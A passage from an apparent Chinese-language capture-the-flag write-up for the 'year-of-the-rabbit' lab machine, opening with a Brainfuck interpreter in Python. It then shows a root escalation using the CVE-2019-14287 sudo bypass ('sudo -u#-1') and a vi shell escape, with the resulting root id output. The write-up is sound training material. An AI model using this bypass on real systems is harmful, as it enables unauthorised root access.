code = """

# Brainfuck 解释器
tape = [0] * 30000
ptr = 0
i = 0
output = ""

while i < len(code):
    c = code[i]
    if c == '>':
        ptr += 1
    elif c == '<':
        ptr -= 1
    elif c == '+':
        tape[ptr] = (tape[ptr] + 1) & 0xFF
    elif c == '-':
        tape[ptr] = (tape[ptr] - 1) & 0xFF
    elif c == '.':
        output += chr(tape[ptr])
    elif c == '[':
        if tape[ptr] == 0:
            depth = 1
            while depth > 0:
                i += 1
                if code[i] == '[':
                    depth += 1
                elif code[i] == ']':
                    depth -= 1
    elif c == ']':
        if tape[ptr] != 0:
            depth = 1
            while depth > 0:
                i -= 1
                if code[i] == '[':
                    depth -= 1
                elif code[i] == ']':
                    depth += 1
    i += 1

print(output)

这个 sudo 规则非常特别：可以以除了 root 以外的身份的身份无密码执行 /usr/bin/vi /home/gwendoline/user.txt

gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

但是我们需要的就是 root 身份，谷歌搜索找到 sudo 绕过技巧 CVE-2019-14287

sudo -u#-1 允许用户以 root 身份执行命令，即使规则中写了 !root

在进入 vi 界面后，在命令模式输入 :!/bin/bash 即可提权

gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root@year-of-the-rabbit:/home/gwendoline# id
uid=0(root) gid=0(root) groups=0(root)
